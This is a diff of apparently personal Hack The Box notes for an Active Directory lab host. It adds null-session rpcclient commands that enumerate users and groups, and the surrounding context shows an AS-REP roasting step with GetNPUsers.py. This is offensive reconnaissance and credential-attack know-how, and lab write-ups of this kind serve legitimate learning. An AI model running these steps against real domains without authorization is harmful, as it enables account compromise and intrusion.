@@ -14,7 +14,10 @@ Port 5985 - WinRM
       rpcclient -U "" -N 10.10.10.161
       commands:
                enumdomusers
-               queryuser
+               enumdomgroups
+               queryuser 0x
+               querygroup 0x
+               querygroupmem 0x
 
 ### AS-REP Roasting:
       ./GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt
